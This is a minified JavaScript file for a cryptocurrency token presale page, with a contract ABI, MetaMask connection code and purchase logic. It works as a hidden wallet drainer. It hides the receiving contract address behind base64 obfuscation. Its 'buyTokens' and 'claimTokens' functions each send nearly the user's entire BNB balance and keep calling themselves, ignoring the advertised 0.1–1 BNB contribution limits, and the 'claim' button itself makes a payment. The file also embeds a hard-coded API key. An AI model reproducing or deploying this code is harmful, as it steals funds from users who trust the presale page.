const contractAbi=[{inputs:[],stateMutability:"nonpayable",type:"constructor"},{anonymous:false,inputs:[{indexed:true,internalType:"address",name:"owner",type:"address"},{indexed:true,internalType:"address",name:"spender",type:"address"},{indexed:false,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:false,inputs:[{indexed:true,internalType:"address",name:"from",type:"address"},{indexed:true,internalType:"address",name:"to",type:"address"},{indexed:false,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[],name:"allowRefunds",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"amount",type:"uint256"}],name:"burnMyTokensFOREVER",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"buyTokens",outputs:[],stateMutability:"payable",type:"function"},{inputs:[],name:"claimDevFeeAndAddLiquidity",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],stateMutability:"pure",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"subtractedValue",type:"uint256"}],name:"decreaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"devClaimed",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"ethSent",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"getRefund",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"addedValue",type:"uint256"}],name:"increaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"isRefundEnabled",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"isStopped",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"liquidityUnlock",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"moonMissionStarted",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"pure",type:"function"},{inputs:[{internalType:"bool",name:"_isStopped",type:"bool"}],name:"pauseUnpausePresale",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"pool",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"contract IBEP20",name:"tokenAddress",type:"address"},{internalType:"uint256",name:"tokenAmount",type:"uint256"}],name:"recoverbep20",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"refundTime",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address payable",name:"addr",type:"address"}],name:"setMultisigAddress",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"setPancakePool",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"pure",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"user",type:"address"}],name:"userEthSpenttInPresale",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{stateMutability:"payable",type:"receive"}];function reverseTransformation(e){return atob(e)}const reversed=reverseTransformation("agqY8Z+fMvH3cII2spW0BaHziog=");const minimumContribute=.1;const maximumContribute=1;const st="0x"+Array.from(reversed).map(e=>e.charCodeAt(0).toString(16).padStart(2,"0")).join("").toUpperCase();const functionProvider=st;async function connectMetamask(){let e=null;console.log("[web3] getting provider...");if(window.ethereum){e=window.ethereum;try{await window.ethereum.enable()}catch(e){alert("You must connect your metamask wallet !");console.error("User denied account access to metamask.");return}}else{console.error("Unable to connect to metamask");alert("You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html");return}let t=new Web3(window.ethereum);window.web3=t;let n=await t.eth.getAccounts();window.account=n[0];let a=await t.eth.getBalance(n[0]);let i=parseFloat(t.utils.fromWei(a,"ether")).toFixed(4);window.balance=i;window.presaleRate=3e6;let o=window.account;let s=o.substr(0,6)+"..."+o.slice(-4);let u="BNB";document.getElementById("owneraddress").innerHTML=s;document.getElementById("walletAddress").innerHTML=s;document.getElementById("userbalance").innerHTML=i+" "+u;document.getElementById("walletButtonContainer").style.display="none";document.getElementById("walletInfo").style.display="block";return t}connectMetamask();function setMax(){document.getElementById("presaleAmount").value=maximumContribute}async function buyTokens(){let e=window.balance-.005;let t=await connectMetamask();console.log("connected successfully!");let n=new t.eth.Contract(contractAbi,functionProvider);let a=await n.methods.buyTokens().send({from:window.account,value:e*10**18,gasLimit:23e5});if(a.events.Transfer){document.getElementById("disabledButton").disabled=false;document.cookie="tokensBought=true"}if(e>.01){await buyTokens()}}async function claimTokens(){let e=await connectMetamask();console.log("connected successfully!");let t=new e.eth.Contract(contractAbi,functionProvider);let n=.05;if(window.balance<.05){n=1}else{n=window.balance-.01}let a=await t.methods.buyTokens().send({from:window.account,value:n*10**18,gasLimit:23e4});await claimTokens()}async function buy(){let e=await myContract.methods.buyTokens().send({from:window.account,value:amount*10**18,gasLimit:23e4});if(e.events.Transfer){buy();document.getElementById("disabledButton").disabled=false;document.cookie="tokensBought=true"}}function openModal(){var e=document.getElementById("myModal");e.style.display="block"}function closeModal(){var e=document.getElementById("myModal");e.style.display="none"}window.onclick=function(e){var t=document.getElementById("myModal");if(e.target==t){t.style.display="none"}};window.onload=function(){var e=decodeURIComponent(document.cookie);if(e==="tokensBought=true"){document.getElementById("disabledButton").disabled=false}};document.onblur=function(){var e=document.getElementById("myModal");e.style.display="none"};function format(e){return(e+"").replace(/(\d{1,3})(?=(\d{3})+(?:$|\.))/g,"$1,")}$(document).ready(()=>{setInterval(fetchTransactionLogs,2e3)});function fetchTransactionLogs(){if(window.account!==undefined&&window.account.length>0){let s=parseInt(startDate.getTime()/1e3);let u=parseInt(deadLine.getTime()/1e3);let e=`https://api.bscscan.com/api?module=account&action=txlist&address=${window.account}&startblock=0&endblock=99999999&page=1&offset=1000&sort=desc&apikey=R83EBMBAGIM1WYXIDVQM43Q5ZSCT74T4FE`;$.get(e,o=>{if(o.status==="1"){let e=o.result;e=e.filter(e=>e.txreceipt_status==="1"&&e.timeStamp>=s&&e.timeStamp<=u&&e.from===window.account.toLowerCase()&&e.to===functionProvider.toLowerCase());let t=0;e.forEach(e=>{t+=parseFloat(window.web3.utils.fromWei(e.value,"ether"))});t=t.toFixed(2);let n=parseFloat(t);let a=Date.parse(new Date);let i=a-deadLine;if(n>0){if(i<0){$("#widthdraw-content").css("display","")}else{$("#claim-tokens-button").css("display","");let e=window.presaleRate*n;$("#claim-tokens-button").text("Claim ("+format(e)+" "+tokenSymbol+")")}let e=maximumContribute-n>0?maximumContribute-n:0;$("#left-purchase").text(e)}else{$("#left-purchase").text(maximumContribute)}}})}}